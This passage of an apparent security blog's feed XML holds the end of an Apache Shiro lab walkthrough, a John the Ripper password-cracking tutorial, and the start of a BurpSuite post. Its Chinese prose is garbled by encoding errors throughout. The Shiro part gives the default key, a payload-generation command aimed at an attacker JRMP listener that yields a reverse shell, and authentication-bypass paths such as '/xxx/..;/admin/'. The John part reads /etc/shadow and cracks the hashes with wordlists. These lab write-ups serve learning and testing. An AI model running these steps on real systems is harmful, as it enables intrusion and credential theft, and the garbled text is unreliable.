&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p>ä»£ç ä¸­key = base64.b64decode(â€œkPH+bIxk5D2deZiIxcaaaA==â€)è¿™ä¸€è¡Œæ‹¬å·å†…å³ä¸ºAESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœå¯†é’¥æ˜¯å…¶ä»–çš„ï¼Œåœ¨è¿™é‡Œå°±å¡«å†™å…¶ä»–çš„å¯†é’¥ã€‚è„šæœ¬è¿è¡Œçš„å‘½ä»¤å¦‚ä¸‹ï¼ˆè¯»è€…åº”å½“æ›´æ”¹ä¸ºæ”»å‡»æœºip:JRMPç›‘å¬çš„ç«¯å£å·ï¼‰ï¼Œæ³¨æ„shiro.pyçš„ä½ç½®åº”å½“ä¿è¯å’Œysoserial.jaråœ¨åŒä¸€ç›®å½•ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro.py 192.168.192.133:7777</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±ç”Ÿæˆäº†è¯·æ±‚åŒ…ä¸­rememberMeçš„payload2ï¼š<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b79377aefe08908354caa21b14aa6bdc.png" alt="img"></p><p>step4:æ›´æ”¹è¯·æ±‚åŒ…ä¸­cookieçš„rememberMeå­—æ®µ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/66d8b31a6da48a1111e95e9630a90d35.png" alt="img"></p><p>æˆ‘ä»¬è¦åœ¨è¿™ä¸ªæ•°æ®åŒ…çš„Cookieå­—æ®µåæ·»åŠ rememberMeå­—æ®µï¼Œæ·»åŠ åçš„æˆªå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/afddc68f09bcabc6d4bfafd8ef88b694.png" alt="img"></p><p>ç„¶åç‚¹å‡»å‘é€goï¼Œè¿”å›å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å“åº”åŒ…ä¸­çš„rememberMe=deleteMeå­—æ®µï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/95cf91d1d4e5249d14d398b0c6748f3a.png" alt="img"></p><p>è¿™æ ·åº”è¯¥å°±åº”è¯¥æ¼æ´åˆ©ç”¨æˆåŠŸäº†ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹åˆšæ‰JRMPç›‘å¬çš„ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæœåŠ¡ä¸é¶æœºï¼ˆ192.168.200.129ï¼‰è¿›è¡Œäº†è¿æ¥é€šä¿¡ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/48477a82a4d7e2ec5ead3508bb66289a.png" alt="img"></p><p>å†çœ‹ä¸€ä¸‹æ”»å‡»æœºç›‘å¬çš„6666ç«¯å£ï¼ŒæˆåŠŸè·å–äº†åå¼¹shellã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6e29b76c89cffb995e65d9c11266a157.png" alt="img"></p><p>è¿™æ ·å°±æˆåŠŸäº†ï¼Œæ­¤æ—¶å·²ç»å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c551dc623cf208855178523f1d9ff6e1.png" alt="img"></p><h5 id="æ”»å‡»è¿‡ç¨‹å¤ç›˜">æ”»å‡»è¿‡ç¨‹å¤ç›˜</h5><p>å¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œæ ¸å¿ƒå°±æ˜¯å¹²äº†ä¸¤ä»¶äº‹ï¼š</p><p>1.æ­å»ºVPSè¿›è¡ŒJRMPListenerï¼Œå­˜æ”¾åå¼¹shellçš„payload1</p><p>2.å°†ä¸Šè¿°VPSè¿›è¡ŒJRMPListenerçš„åœ°å€è¿›è¡Œäº†AESåŠ å¯†å’Œbase64ç¼–ç ï¼Œæ„é€ è¯·æ±‚åŒ…cookieä¸­çš„rememberMeå­—æ®µï¼Œå‘å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨å‘é€åŠ å¯†ç¼–ç åçš„ç»“æœpayload2ã€‚</p><p>é‚£ä¹ˆå¯¹äºé¶æœºæœåŠ¡å™¨ï¼Œä»–æ˜¯æ€ä¹ˆæ²¦é™·çš„å‘¢ï¼Ÿ</p><p>1.æ¥æ”¶åˆ°è¯·æ±‚åŒ…payload2ï¼Œå¯¹ä»–è¿›è¡Œbase64è§£ç =&gt;AESè§£å¯†ï¼Œå‘ç°è¦å’Œä¸€ä¸ªVPSçš„JRMP 7777ç«¯å£è¿›è¡Œé€šä¿¡ã€‚</p><p>2.å‘æ¶æ„ç«™ç‚¹VPSçš„JRMP 7777è¿›è¡Œè¯·æ±‚ï¼Œæ¥æ”¶åˆ°äº†åˆ°äº†åºåˆ—åŒ–åçš„æ¶æ„ä»£ç ï¼ˆåå¼¹shellåˆ°æ”»å‡»æœºçš„6666ç«¯å£ï¼‰payload1ã€‚</p><p>3.å¯¹payload1æ‰§è¡Œäº†ååºåˆ—åŒ–ï¼Œæ‰§è¡Œäº†åå¼¹shellçš„æ¶æ„å‘½ä»¤ï¼Œå°±æ­¤æ²¦é™·ã€‚</p><h4 id="ä½¿ç”¨å·¥å…·å¤ç°">ä½¿ç”¨å·¥å…·å¤ç°</h4><p>ä½¿ç”¨win10çš„å·¥å…·pyke-shiro</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330181125476.png" alt="image-20250330181125476"></p><p>çœ‹åˆ°å­˜åœ¨Shiroæ¡†æ¶ä¸”çˆ†ç ´å‡ºæ¥äº†keyå€¼ï¼Œç„¶åæˆ‘ä»¬æ£€æµ‹åˆ©ç”¨é“¾ç„¶åçˆ†ç ´ä¸€ä¸‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330181444484.png" alt="image-20250330181444484"></p><p>ç„¶åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œæˆ–è€…æ‰“å†…å­˜é©¬äº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330181608319.png" alt="image-20250330181608319"></p><h3 id="Apache-Shiroè®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-1957ï¼‰">Apache Shiroè®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-1957ï¼‰</h3><h4 id="æ¼æ´è¯¦æƒ…">æ¼æ´è¯¦æƒ…</h4><p>Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><p>åœ¨Apache Shiro 1.5.2ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œåœ¨ä½¿ç”¨SpringåŠ¨æ€æ§åˆ¶å™¨æ—¶ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ â€¦;è¿™æ ·çš„è·³è½¬ï¼Œå¯ä»¥ç»•è¿‡Shiroä¸­å¯¹ç›®å½•çš„æƒé™é™åˆ¶</p><h4 id="å¤ç°">å¤ç°</h4><p>é¶æœºå¼€å¯ç¯å¢ƒåï¼Œæ”»å‡»æœºç›´æ¥è®¿é—®ip:8080ç«¯å£</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330182715628.png" alt="image-20250330182715628"></p><p>ç›´æ¥è¯·æ±‚ç®¡ç†é¡µé¢/admin/ï¼Œæ— æ³•è®¿é—®ï¼Œå°†ä¼šè¢«é‡å®šå‘åˆ°ç™»å½•é¡µé¢,æ„é€ æ¶æ„è¯·æ±‚/xxx/â€¦;/admin/ï¼Œå³å¯ç»•è¿‡æƒé™æ ¡éªŒï¼Œè®¿é—®åˆ°ç®¡ç†é¡µé¢ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d354235a495d492caab88a4a121e2984.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Apache-Shiro-è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2010-3863ï¼‰">Apache Shiro è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2010-3863ï¼‰</h3><h4 id="æ¼æ´è¯¦æƒ…-2">æ¼æ´è¯¦æƒ…</h4><p>Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><p>åœ¨Apache Shiro 1.1.0ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œshiro è¿›è¡Œæƒé™éªŒè¯å‰æœªå¯¹url åšæ ‡å‡†åŒ–å¤„ç†ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ /ã€//ã€/./ã€/â€¦/ ç­‰ç»•è¿‡æƒé™éªŒè¯</p><h4 id="å¤ç°-2">å¤ç°</h4><p>ç›´æ¥è¯·æ±‚ç®¡ç†é¡µé¢/adminï¼Œæ— æ³•è®¿é—®ï¼Œå°†ä¼šè¢«é‡å®šå‘åˆ°ç™»å½•é¡µé¢</p><p>æ„é€ æ¶æ„è¯·æ±‚/./adminï¼Œå³å¯ç»•è¿‡æƒé™æ ¡éªŒï¼Œè®¿é—®åˆ°ç®¡ç†é¡µé¢</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330184715714.png" alt="image-20250330184715714"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330184851335.png" alt="image-20250330184851335"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§Shiroååºåˆ—åŒ–æ¼æ´å…¨è§£æ;shiroæ¼æ´æˆå› ;shiroæ¼æ´ç¯å¢ƒåŠshiroæ¼æ´å¤ç°;shiroæ¼æ´ç‰¹å¾ï¼›shiro550ï¼ˆCVE-2016-4437ï¼‰æ¼æ´åŸç†å’Œæ¼æ´å¤ç°ï¼›Apache Shiroè®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-1957ï¼‰æ¼æ´åŸç†å’Œæ¼æ´å¤ç°ï¼›Apache Shiro è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2010-3863ï¼‰æ¼æ´åŸç†å’Œæ¼æ´å¤ç°</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>linuxã€windowså¯†é’¥æš´åŠ›ç ´è§£å·¥å…·johnçš„ä½¿ç”¨</title>
    <link href="https://blog.m3x1.cn/posts/b2b54c4f.html"/>
    <id>https://blog.m3x1.cn/posts/b2b54c4f.html</id>
    <published>2025-03-18T16:00:00.000Z</published>
    <updated>2025-03-19T14:19:17.023Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="ä»€ä¹ˆæ˜¯john">ä»€ä¹ˆæ˜¯john</h4><p><code>John the Ripper</code> æ˜¯ä¸€æ¬¾å¤§å—æ¬¢è¿çš„ã€å…è´¹çš„å¼€æºè½¯ä»¶ã€‚ä¹Ÿæ˜¯ä¸€ä¸ªåŸºäºå­—å…¸çš„å¿«é€Ÿç ´è§£å¯†ç çš„å·¥å…·ï¼Œæ˜¯ä¸€æ¬¾ç”¨äºåœ¨å·²çŸ¥å¯†æ–‡çš„æƒ…å†µä¸‹å°è¯•ç ´è§£å‡ºæ˜æ–‡çš„ç ´è§£å¯†ç è½¯ä»¶ï¼Œæ”¯æŒç›®å‰å¤§å¤šæ•°çš„åŠ å¯†ç®—æ³•ï¼Œå¦‚ <code>DES</code> ã€ <code>MD4</code> ã€ <code>MD5</code> ç­‰ã€‚ <code>John the Ripper</code> æ”¯æŒå­—å…¸ç ´è§£æ–¹å¼å’Œæš´åŠ›ç ´è§£æ–¹å¼ã€‚å®ƒæ”¯æŒå¤šç§ä¸åŒç±»å‹çš„ç³»ç»Ÿæ¶æ„ï¼ŒåŒ…æ‹¬ <code>Unix</code> ã€ <code>Linux</code> ã€ <code>Windows</code> ã€ <code>DOS</code> æ¨¡å¼ã€ <code>BeOS</code> å’Œ <code>OpenVMS</code> ï¼Œä¸»è¦ç›®çš„æ˜¯ç ´è§£ä¸å¤Ÿç‰¢å›ºçš„ <code>Unix/Linux</code> ç³»ç»Ÿå¯†ç ã€‚</p><p>johnä¸€èˆ¬æ˜¯kaliè‡ªå¸¦ã€‚</p><h4 id="johnå‚æ•°è¡¨">johnå‚æ•°è¡¨</h4><p><code>john</code> å‘½ä»¤çš„å…·ä½“å‚æ•°é€‰é¡¹å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>é€‰ é¡¹</th><th>æ è¿°</th></tr></thead><tbody><tr><td>â€“single</td><td>single crack æ¨¡å¼ï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶ä¸­çš„è§„åˆ™è¿›è¡Œç ´è§£</td></tr><tr><td>â€“wordlist=FILEâ€“stdin</td><td>å­—å…¸æ¨¡å¼ï¼Œä» FILE æˆ–æ ‡å‡†è¾“å…¥ä¸­è¯»å–è¯æ±‡</td></tr><tr><td>â€“rules</td><td>æ‰“å¼€å­—å…¸æ¨¡å¼çš„è¯æ±‡è¡¨åˆ‡åˆ†è§„åˆ™</td></tr><tr><td>â€“incremental[=MODE]</td><td>ä½¿ç”¨å¢é‡æ¨¡å¼</td></tr><tr><td>â€“external=MODE</td><td>æ‰“å¼€å¤–éƒ¨æ¨¡å¼æˆ–å•è¯è¿‡æ»¤ï¼Œä½¿ç”¨ [List.External:MODE] èŠ‚ä¸­å®šä¹‰çš„å¤–éƒ¨å‡½æ•°</td></tr><tr><td>â€“stdout[=LENGTH]</td><td>ä¸è¿›è¡Œç ´è§£ï¼Œä»…ä»…æŠŠç”Ÿæˆçš„ã€è¦æµ‹è¯•æ˜¯å¦ä¸ºå£ä»¤çš„è¯æ±‡è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸Š</td></tr><tr><td>â€“restore[=NAME]</td><td>æ¢å¤è¢«ä¸­æ–­çš„ç ´è§£è¿‡ç¨‹ï¼Œä»æŒ‡å®šæ–‡ä»¶æˆ–é»˜è®¤ä¸º $JOHN/john.rec çš„æ–‡ä»¶ä¸­è¯»å–ç ´è§£è¿‡ç¨‹çš„çŠ¶æ€ä¿¡æ¯</td></tr><tr><td>â€“session=NAME</td><td>å°†æ–°çš„ç ´è§£ä¼šè¯å‘½åä¸º NAME ï¼Œè¯¥é€‰é¡¹ç”¨äºä¼šè¯ä¸­æ–­æ¢å¤å’ŒåŒæ—¶è¿è¡Œå¤šä¸ªç ´è§£å®ä¾‹çš„æƒ…å†µ</td></tr><tr><td>â€“status[=NAME]</td><td>æ˜¾ç¤ºä¼šè¯çŠ¶æ€</td></tr><tr><td>â€“make-charset=FILE</td><td>ç”Ÿæˆä¸€ä¸ªå­—ç¬¦é›†æ–‡ä»¶ï¼Œè¦†ç›– FILE æ–‡ä»¶ï¼Œç”¨äºå¢é‡æ¨¡å¼</td></tr><tr><td>â€“show</td><td>æ˜¾ç¤ºå·²ç ´è§£å£ä»¤</td></tr><tr><td>â€“test</td><td>è¿›è¡ŒåŸºå‡†æµ‹è¯•</td></tr><tr><td>â€“users=[-]LOGIN|UID[,â€¦]</td><td>é€‰æ‹©æŒ‡å®šçš„ä¸€ä¸ªæˆ–å¤šä¸ªè´¦æˆ·è¿›è¡Œç ´è§£æˆ–å…¶ä»–æ“ä½œï¼Œåˆ—è¡¨å‰çš„å‡å·è¡¨ç¤ºåå‘æ“ä½œï¼Œè¯´æ˜å¯¹åˆ—å‡ºè´¦æˆ·ä¹‹å¤–çš„è´¦æˆ·è¿›è¡Œç ´è§£æˆ–å…¶ä»–æ“ä½œ</td></tr><tr><td>â€“groups=[-]GID[,â€¦]</td><td>å¯¹æŒ‡å®šç”¨æˆ·ç»„çš„è´¦æˆ·è¿›è¡Œç ´è§£ï¼Œå‡å·è¡¨ç¤ºåå‘æ“ä½œï¼Œè¯´æ˜å¯¹åˆ—å‡ºç»„ä¹‹å¤–çš„è´¦æˆ·è¿›è¡Œç ´è§£ã€‚</td></tr><tr><td>â€“shells=[-]SHELL[,â€¦]</td><td>å¯¹ä½¿ç”¨æŒ‡å®š shell çš„è´¦æˆ·è¿›è¡Œæ“ä½œï¼Œå‡å·è¡¨ç¤ºåå‘æ“ä½œ</td></tr><tr><td>â€“salts=[-]COUNT</td><td>è‡³å°‘å¯¹ COUNT å£ä»¤åŠ è½½åŠ ç›ï¼Œå‡å·è¡¨ç¤ºåå‘æ“ä½œ</td></tr><tr><td>â€“format=NAME</td><td>æŒ‡å®šå¯†æ–‡æ ¼å¼åç§°ï¼Œä¸º DES/BSDI/<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020">MD5</a>/BF/AFS/LM ä¹‹ä¸€</td></tr><tr><td>â€“save-memory=LEVEL</td><td>è®¾ç½®å†…å­˜èŠ‚çœæ¨¡å¼ï¼Œå½“å†…å­˜ä¸å¤šæ—¶é€‰ç”¨è¿™ä¸ªé€‰é¡¹ã€‚ LEVEL å–å€¼åœ¨ 1~3 ä¹‹é—´</td></tr></tbody></table><h4 id="etc-passedå’Œetc-shadowæ–‡ä»¶">etc/passedå’Œetc/shadowæ–‡ä»¶</h4><p>é¦–å…ˆè¦çŸ¥é“ /etc/passwdæ–‡ä»¶å’Œ /etc/shadowæ–‡ä»¶</p><p>/etc/passwdæ–‡ä»¶æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ•°æ®ä¸ºpasswdæ–‡ä»¶çš„ä¸€ä¸ªç‰‡æ®µï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ¯ä¸€è¡Œéƒ½è¢«<code>åˆ†å·</code>åˆ†ä¸ºäº†<code>7éƒ¨åˆ†</code>ã€‚è¿™ä¸ƒéƒ¨åˆ†åˆ†åˆ«ä¸ºï¼š</p><blockquote><ol><li>ç”¨æˆ·å</li><li>å¯†ç (passwdæ–‡ä»¶äººäººå¯è¯»ï¼Œæ‰€ä»¥ä¸æ”¾æ˜æ–‡å¯†ç ï¼ŒçœŸæ­£çš„å¯†ç åœ¨/etc/shadowæ–‡ä»¶ä¸­)</li><li>uid</li><li>gid</li><li>ç”¨æˆ·æ³¨é‡Š</li><li>ä¸»ç›®å½•</li><li>ç™»é™†çš„shellç±»å‹(bash/zsh/shç­‰)</li></ol></blockquote><p>/etc/shadowæ–‡ä»¶æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$f0EotKbw$sLAujh0EleiXNAuoph20iL517cXlcExWLATwz3xgCEyYlsIECUa9nuDdiT5/ntWfJDfxFhYGcMknkCq5Awgf20:15118:0:99999:7:::</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯è¢«åˆ†å·éš”å¼€æ ¼å¼ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·å</span><br><span class="line">å¯†ç ï¼Œå…¶ä¸­\$6\$æ˜¯è¡¨ç¤ºä¸€ç§ç±»å‹æ ‡è®°ä¸º6çš„å¯†ç æ•£åˆ—suans fa,è¿™é‡ŒæŒ‡SHA-512å“ˆå¸Œç®—æ³•ï¼Œ1 ä»£è¡¨ MD5ï¼Œ5 ä»£è¡¨ SHA-256ï¼Œ6 ä»£è¡¨ SHA-512,salt è¡¨ç¤ºå¯†ç å­¦ä¸­çš„ Salt, ç³»ç»Ÿéšæœºç”Ÿæˆ encrypted è¡¨ç¤ºå¯†ç çš„ hash,å…¶ä¸­f0EotKbwä¸ºsaltã€‚</span><br><span class="line">â€œæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´â€è¡¨ç¤ºçš„æ˜¯ä»æŸä¸ªæ—¶åˆ»èµ·ï¼Œåˆ°ç”¨æˆ·æœ€åä¸€æ¬¡ä¿®æ”¹å£ä»¤æ—¶çš„å¤©æ•°ã€‚æ—¶é—´èµ·ç‚¹å¯¹ä¸åŒçš„ç³»ç»Ÿå¯èƒ½ä¸ä¸€æ ·ã€‚ä¾‹å¦‚åœ¨SCOLinuxä¸­ï¼Œè¿™ä¸ªæ—¶é—´èµ·ç‚¹æ˜¯1970å¹´1æœˆ1æ—¥ã€‚</span><br><span class="line">â€œæœ€å°æ—¶é—´é—´éš”â€æŒ‡çš„æ˜¯ä¸¤æ¬¡ä¿®æ”¹å£ä»¤ä¹‹é—´æ‰€éœ€çš„æœ€å°å¤©æ•°ã€‚</span><br><span class="line">â€œæœ€å¤§æ—¶é—´é—´éš”â€æŒ‡çš„æ˜¯å£ä»¤ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚</span><br><span class="line">â€œè­¦å‘Šæ—¶é—´â€å­—æ®µè¡¨ç¤ºçš„æ˜¯ä»ç³»ç»Ÿå¼€å§‹è­¦å‘Šç”¨æˆ·åˆ°ç”¨æˆ·å¯†ç æ­£å¼å¤±æ•ˆä¹‹é—´çš„å¤©æ•°ã€‚</span><br><span class="line">â€œä¸æ´»åŠ¨æ—¶é—´â€è¡¨ç¤ºçš„æ˜¯ç”¨æˆ·æ²¡æœ‰ç™»å½•æ´»åŠ¨ä½†è´¦å·ä»èƒ½ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚</span><br><span class="line">â€œå¤±æ•ˆæ—¶é—´â€å­—æ®µç»™å‡ºçš„æ˜¯ä¸€ä¸ªç»å¯¹çš„å¤©æ•°ï¼Œå¦‚æœä½¿ç”¨äº†è¿™ä¸ªå­—æ®µï¼Œé‚£ä¹ˆå°±ç»™å‡ºç›¸åº”è´¦å·çš„ç”Ÿå­˜æœŸã€‚æœŸæ»¡åï¼Œè¯¥è´¦å·å°±ä¸å†æ˜¯ä¸€ä¸ªåˆæ³•çš„è´¦å·ï¼Œä¹Ÿå°±ä¸èƒ½å†ç”¨æ¥ç™»å½•äº†ã€‚</span><br></pre></td></tr></table></figure><h4 id="çˆ†ç ´linuxç”¨æˆ·å¯†ç å®ä¾‹">çˆ†ç ´linuxç”¨æˆ·å¯†ç å®ä¾‹</h4><p><strong>åˆ©ç”¨ <code>unshadow</code> ç»„åˆ <code>/etc/passwd</code> å’Œ <code>/etc/shadow</code> ä¸¤ä¸ªæ–‡ä»¶</strong></p><p><code>unshadow</code> å‘½ä»¤ä¼šå°† <code>/etc/passwd</code> çš„æ•°æ®å’Œ <code>/etc/shadow</code> çš„æ•°æ®ç»“åˆèµ·æ¥ï¼Œåˆ›å»º <code>1</code> ä¸ªå«æœ‰ç”¨æˆ·åå’Œå¯†ç è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ç»“åˆèµ·æ¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; test_passwd</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ <code>John the Ripper</code> ç ´è§£ <code>Linux</code> ç”¨æˆ·ç™»å½•å¯†ç </strong></p><p>æˆ‘ä»¬è¿™æ—¶å€™è¿˜éœ€è¦ä¸€ä¸ªå­—å…¸ï¼Œç”±äº <code>John</code> è‡ªå¸¦äº†ä¸€ä¸ªå­—å…¸ï¼Œå­—å…¸ä½äº <code>/usr/share/john/password.lst</code> ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥è‡ªè¡Œå»ç½‘ä¸Šé€‰æ‹©é€‚åˆä½ çš„å­—å…¸ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¼€å§‹å¯¹Linuxç™»å½•ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç ´è§£ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=<span class="regexp">/usr/</span>share/john/password.<span class="property">lst</span> test_passwd</span><br></pre></td></tr></table></figure><p>ç ´è§£ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23bd8f0643eccb8b765a9b0aa6ce29d0.png" alt="img"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ <code>test_passwd</code> æ–‡ä»¶ä¸­å­˜åœ¨çš„ä¸‰ä¸ªç”¨æˆ·å <code>root</code> ï¼Œ<code>test</code> ï¼Œ <code>python</code> çš„å¯†ç ï¼Œå‡è¢«ç ´è§£äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç ´è§£ä¿¡æ¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c612252f150ba86218bfa1af040494b.png" alt="img"></p><h4 id="å‡ºç°æŠ¥é”™ï¼š-UTF-8-No-password-hashes-loaded">å‡ºç°æŠ¥é”™ï¼š UTF-8 No password hashes loaded</h4><p>John the Ripper æ­£ç¡®ä½¿ç”¨æ–¹æ³•<br>ç°åœ¨ John the Ripper çˆ†ç ´linuxçš„shadowæ–‡ä»¶æ—¶éœ€è¦åŠ ä¸Š --format=crypt</p><p>æ‰€ä»¥ç°åœ¨ John the Ripper çš„ä½¿ç”¨å‘½ä»¤ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john /etc/shadow --format=crypt</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯ï¼Œå¦‚æœæŸ¥çœ‹åˆå¹¶åçš„æ–‡ä»¶æˆ–è€…æ²¡åˆå¹¶ä½¿ç”¨çš„shadowæ–‡ä»¶ï¼Œå¹¶åœ¨ç”¨æˆ·ååé¢çœ‹åˆ° <strong>$y$</strong>ï¼Œåˆ™è¡¨æ˜å¯†ç å·²ä½¿ç”¨ yescrypt è¿›è¡Œå“ˆå¸Œå¤„ç†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1622299-20220311151213389-1526416476.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§kaliä¸­æš´åŠ›ç ´è§£å·¥å…·johnçš„ä½¿ç”¨æ–¹æ³•ä»¥åŠå‘½ä»¤è§£æ;/etc/passwdæ–‡ä»¶å’Œ/etc/shadowæ–‡ä»¶æ ¼å¼;linuxå¯†ç çˆ†ç ´å®ä¾‹;å‡ºç°æŠ¥é”™ï¼šâ€œUTF-8 No password hashes loadedâ€çš„åŸå› åŠè§£å†³æ–¹æ³•</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å·¥å…·ä½¿ç”¨" scheme="https://blog.m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuiteä¸­æ–‡ç‰ˆå‡ºç°æ˜¾ç¤ºé”™ä½æƒ…å†µè§£å†³</title>
    <link href="https://blog.m3x1.cn/posts/3f399677.html"/>
    <id>https://blog.m3x1.cn/posts/3f399677.html</id>
    <published>2025-03-17T16:00:00.000Z</published>
    <updated>2025-03-20T16:06:00.416Z</updated>
    
